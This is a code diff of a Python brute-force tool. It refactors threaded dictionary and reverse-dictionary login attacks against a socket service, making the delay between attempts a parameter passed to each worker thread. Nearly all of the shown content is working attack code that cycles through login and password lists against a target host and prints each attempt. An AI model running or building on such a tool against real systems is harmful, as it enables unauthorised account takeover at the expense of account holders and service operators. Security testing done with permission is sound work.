@@ -67,18 +67,17 @@ class Client:
 		self.__sock.close()
 
 
-def login_attempt(target, login, password):
-	time.sleep(DELAY)
-	target.send_login(login)
-	target.send_password(password)
-	result = target.get_attempt_success()
+def login_attempt(client, login, password):
+	client.send_login(login)
+	client.send_password(password)
+	result = client.get_attempt_success()
 	if result:
 		return SUCCESS
 	else:
 		return FAILURE
 
 
-def dict_attack(target_client, queue, password_list):
+def dict_attack(client, queue, password_list, delay):
 	"""
 	 Dictionary attack of target url based on
 	 default brute force (try all password for every login)
@@ -87,17 +86,19 @@ def dict_attack(target_client, queue, password_list):
 	while True:
 		login = queue.get()
 		for passwd in password_list:
-			result = login_attempt(target_client, login, passwd)
+			time.sleep(delay)
+			result = login_attempt(client, login, passwd)
 			with print_lock:
 				print(LOGIN_ATTEMPT.format(result, login, passwd))
 		queue.task_done()
 
 
-def reverse_dict_attack(target_client, login_list, queue):
+def reverse_dict_attack(client, login_list, queue, delay):
 	while True:
 		password = queue.get()
 		for login in login_list:
-			result = login_attempt(target_client, login, password)
+			time.sleep(delay)
+			result = login_attempt(client, login, password)
 			with print_lock:
 				print(LOGIN_ATTEMPT.format(result, login, password))
 		queue.task_done()
@@ -105,11 +106,12 @@ def reverse_dict_attack(target_client, login_list, queue):
 
 
 def brute_force(host
-				, port
-				, logins
-				, passwords
-				, num_threads
-				, reverse = False):
+		, port
+		, logins
+		, passwords
+		, num_threads
+		, delay
+		, reverse):
 
 	queue = Queue()
 
@@ -117,7 +119,6 @@ def brute_force(host
 	clients = []
 
 	if reverse == False:
-
 		for login in logins:
 			queue.put(login)
 
@@ -128,17 +129,18 @@ def brute_force(host
 			client_per_thread.connect()
 			clients.append(client_per_thread)
 			thrd = threading.Thread(target = dict_attack
-                                    , args = (client_per_thread, queue, passwords))
+                                    , args = (client_per_thread, queue, passwords, delay))
 			thrd.daemon = True
 			thrd.start()
 	else:
 		for passwd in passwords:
 				queue.put(passwd)
+
 		for thread_counter in range(num_threads):
 			client_per_thread = Client(host, port)
 			client_per_thread.connect()
 			thrd = threading.Thread(target = reverse_dict_attack
-                                    , args = (client_per_thread, logins, queue))
+                                    , args = (client_per_thread, logins, queue, delay))
 			thrd.daemon = True
 			thrd.start()
 
